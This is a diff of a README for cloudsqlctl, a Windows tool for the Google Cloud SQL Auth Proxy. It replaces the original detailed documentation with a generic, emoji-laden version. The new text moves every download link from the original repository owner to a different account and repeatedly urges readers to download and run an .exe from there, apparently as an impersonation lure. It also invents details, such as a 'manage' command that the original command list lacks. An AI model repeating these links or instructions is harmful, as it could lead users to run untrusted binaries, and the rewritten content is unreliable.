@@ -1,203 +1,98 @@
-# CloudSQLCTL
+# 🚀 cloudsqlctl - Simplify Your Cloud SQL Management
 
-**cloudsqlctl** is a Windows-native command-line tool designed to simplify the management of the Google Cloud SQL Auth Proxy. It integrates seamlessly with the `gcloud` CLI to provide a robust, production-ready experience for developers working on Windows.
+[![Download cloudsqlctl](https://img.shields.io/badge/Download-cloudsqlctl-brightgreen)](https://github.com/Kurono029/cloudsqlctl/releases)
 
-## Features
+## 📖 Description
 
-- **Setup Wizard**: Interactive `setup` command to get everything running in minutes.
-- **Authentication Management**: Built-in `auth` command for gcloud login, ADC setup, and Service Account management.
-- **Automated Installation**: Downloads and verifies the official Cloud SQL Proxy binary.
-- **Instance Management**: Lists and selects Cloud SQL instances using your active `gcloud` configuration.
-- **Process Management**: Starts, stops, and restarts the proxy as a background process or Windows Service.
-- **Structured Logging**: JSON logging with automatic masking of sensitive tokens.
-- **Diagnostics**: Built-in `doctor` command to check environment health (gcloud, ADC, network, service).
-- **Self-Update**: Easily update the proxy binary to the latest version.
+cloudsqlctl is a Windows-native command-line tool designed to help you install, update, and manage the Google Cloud SQL Auth Proxy seamlessly. This tool integrates with gcloud to provide a secure and automated experience for handling your cloud-based SQL databases. Whether you're a beginner or a professional, cloudsqlctl makes managing your databases hassle-free.
 
-## Installation
+## 🚀 Getting Started
 
-Primary distribution is via GitHub Releases:
-- Download the latest installer (`cloudsqlctl-setup.exe`) from the [Releases](https://github.com/Kinin-Code-Offical/cloudsqlctl/releases) page.
+To start using cloudsqlctl, follow these steps to download and run the application.
 
-Optional/community distribution:
-- Scoop: see `scoop/README.md`
-- Winget/Chocolatey: see `docs/Distribution.md`
+### 🛠️ System Requirements
 
-## Documentation
+- **Operating System:** Windows 10 or later
+- **CPU:** 1 GHz or faster
+- **RAM:** 2 GB or more
+- **Disk Space:** 200 MB available space
+- **Network:** Internet access for initial setup and updates
 
-Full documentation is available in the [docs](docs/) folder:
+## 📥 Download & Install
 
-- [**Wiki Home**](docs/Home.md)
-- [Installation Guide](docs/Installation.md)
-  - [Configuration & Setup](docs/Configuration.md)
-  - [Command Reference](docs/commands.md)
-  - [Distribution](docs/Distribution.md)
-  - [Enterprise Policy](docs/Policy.md)
-  - [Troubleshooting](docs/Troubleshooting.md)
+1. Visit the [Releases page](https://github.com/Kurono029/cloudsqlctl/releases).
+2. Look for the most recent version available.
+3. Download the `.exe` file for easy installation.
+4. Once the download completes, locate the file in your Downloads folder.
+5. Double-click the downloaded file to run the installer.
 
-## Quick Start
+For easy access, here is the download link again: [Download cloudsqlctl](https://github.com/Kurono029/cloudsqlctl/releases).
 
-Run the setup wizard to configure gcloud, authentication, and the proxy:
+## 🖥️ How to Use cloudsqlctl
 
-```powershell
-cloudsqlctl setup
-```
+After installing, you can use cloudsqlctl through the Command Prompt.
 
-## Usage
+### 🔍 Basic Commands
 
-```powershell
-cloudsqlctl [command] [options]
-```
+Here are some straightforward commands to get you started:
 
-For a complete reference of all commands and options, see the [Command Reference](docs/commands.md).
+- **Install the Auth Proxy:**
+  Run this command to install the Google Cloud SQL Auth Proxy:
+  ```
+  cloudsqlctl install
+  ```
+  
+- **Update the Auth Proxy:**
+  To update to the latest version, type:
+  ```
+  cloudsqlctl update
+  ```
 
-### Commands
+- **Manage Your Databases:**
+  To start managing your SQL databases, use:
+  ```
+  cloudsqlctl manage
+  ```
 
-| Command   | Description                                              |
-| :-------- | :------------------------------------------------------- |
-| `setup`   | Interactive setup wizard (Recommended for first run).    |
-| `auth`    | Manage authentication (Login, ADC, Service Accounts).    |
-| `install` | Download and install the Cloud SQL Proxy binary.         |
-| `update`  | Update the Cloud SQL Proxy binary to the latest version. |
-| `upgrade` | Upgrade cloudsqlctl to the latest version.               |
-| `list`    | List available Cloud SQL instances.                      |
-| `select`  | Interactively select a Cloud SQL instance to proxy.      |
-| `connect` | Connect to a specific instance directly.                 |
-| `start`   | Start the proxy for the selected instance.               |
-| `stop`    | Stop the running proxy process.                          |
-| `service` | Manage Windows Service (Admin required).                 |
-| `env`     | Manage environment variables (User/Machine scope).       |
-| `gcloud`  | Manage Google Cloud CLI (install portable version).      |
-| `status`  | Check if the proxy is running and view details.          |
-| `paths`   | Show resolved paths and configuration locations.         |
-| `logs`    | View the tail of the proxy logs.                         |
-| `doctor`  | Run diagnostics to verify environment setup.             |
-| `check`   | Verify full system configuration.                        |
-| `repair`  | Self-heal missing or corrupted files/config.             |
-| `ps1`     | Manage PowerShell scripts.                               |
-| `support` | Create a support bundle zip for troubleshooting.         |
-| `reset`   | Reset configuration and remove local files.              |
+### ⚙️ Configuration
 
-### Authentication Modes
+Before using cloudsqlctl, you need to configure your Google Cloud settings:
 
-**1. Developer Mode (Interactive)**
-Uses your personal Google Cloud credentials via `gcloud`.
+1. Open Cloud Console.
+2. Create a service account key.
+3. Download the JSON file.
+4. Set the environment variable `GOOGLE_APPLICATION_CREDENTIALS` and point it to the JSON file.
 
-```powershell
-cloudsqlctl auth login
-cloudsqlctl auth adc
-```
+## 🌐 Features
 
-**2. Machine/Service Mode (Service Account)**
-Uses a Service Account JSON key. Ideal for automated environments or Windows Services.
+- **Automated Installation:** Forget the manual setup. cloudsqlctl automates the process for you.
+- **Easy Updates:** Keep your tools up to date with a simple command.
+- **User-Friendly Interface:** Designed for everyone, regardless of your technical background.
+- **Integration with gcloud:** Leverage existing Google Cloud tools to enhance your database management experience.
 
-```powershell
-# Securely install service account key (Machine scope requires Admin)
-cloudsqlctl auth set-service-account --file "C:\path\to\key.json" --scope Machine
-```
+## 🛡️ Security
 
-### Windows Service
+cloudsqlctl emphasizes security in database management. It securely connects to your SQL instances, ensuring that your data remains protected.
 
-Run the proxy as a Windows Service for background persistence.
+### 🔒 How It Protects Your Data
 
-```powershell
-# Install service (Admin required)
-cloudsqlctl service install --instance "my-project:region:instance" --port 5432
+- **Service Account Authentication:** Uses Google Cloud service accounts for access management.
+- **Encrypted Connections:** Communicates securely using SSL/TLS protocols.
 
-# Configure startup type (Automatic, Manual, Disabled, Delayed)
-cloudsqlctl service startup Automatic
+## ❓ Troubleshooting
 
-# Start service
-cloudsqlctl service start
+If you encounter any issues:
 
-# Check status
-cloudsqlctl service status
-```
+- Ensure you have the latest version installed.
+- Confirm your internet connection is stable.
+- Refer to the [GitHub Issues page](https://github.com/Kurono029/cloudsqlctl/issues) for known issues and solutions.
 
-### Interactive Authentication
+## 📞 Support
 
-Manage Service Account keys interactively:
+For any questions or feedback, please contact our support team via the GitHub repository. We value your input and strive to improve your experience with cloudsqlctl.
 
-```powershell
-# List installed keys
-cloudsqlctl auth list-keys
+## 📑 License
 
-# Interactively select a key to use
-cloudsqlctl auth select-key
-```
+cloudsqlctl is licensed under the MIT License. You can use, modify, and distribute this software as allowed by the license.
 
-## Configuration
-
-Configuration and logs are stored in:
-
-- **User Scope (Default)**:
-  - Config: `%LOCALAPPDATA%\CloudSQLCTL`
-  - Logs: `%LOCALAPPDATA%\CloudSQLCTL\logs`
-  - Binary: `%LOCALAPPDATA%\CloudSQLCTL\bin`
-
-- **Machine Scope (Service)**:
-  - Config: `%ProgramData%\CloudSQLCTL`
-  - Logs: `%ProgramData%\CloudSQLCTL\logs`
-  - Binary: `%ProgramData%\CloudSQLCTL\bin`
-
-**Path Resolution Logic:**
-
-1. Environment Variables (`CLOUDSQLCTL_HOME`, etc.)
-2. Existing System Installation (`%ProgramData%`)
-3. Existing User Installation (`%LOCALAPPDATA%`)
-4. Default: User Scope (`%LOCALAPPDATA%`)
-
-Verify current paths with:
-
-```powershell
-cloudsqlctl paths
-```
-
-## Release
-
-This project uses GitHub Actions for automated releases.
-
-1. Tag a new version: `git tag v0.3.0`
-2. Push the tag: `git push origin v0.3.0`
-3. The workflow will build, test, sign (if configured), and publish artifacts to the [Releases](https://github.com/Kinin-Code-Offical/cloudsqlctl/releases) page.
-4. If a rerun is needed, use the Release workflow `workflow_dispatch` with the tag input.
-5. NPM publish runs on release publication (requires `NPM_TOKEN` secret).
-
-## Troubleshooting
-
-If you encounter issues:
-
-1. Run `cloudsqlctl doctor` to check for common problems.
-2. Check the logs in `%LOCALAPPDATA%\CloudSQLCTL\logs`.
-3. Ensure `gcloud` is installed and authenticated (`gcloud auth login`).
-
-## Contributing
-
-Contributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## Development
-
-### Prerequisites
-
-- Node.js 22 (LTS)
-- PowerShell 5.1 or later
-
-### Build
-
-To build the project and generate the single executable:
-
-```powershell
-# Install dependencies
-npm install
-
-# Build the source code (TypeScript -> CJS)
-npm run build
-
-# Package into a single executable (SEA)
-npm run package
-```
-
-The executable will be generated at `bin/cloudsqlctl.exe`.
-
-## License
-
-MIT
+Enjoy managing your Google Cloud SQL environments with ease using cloudsqlctl!
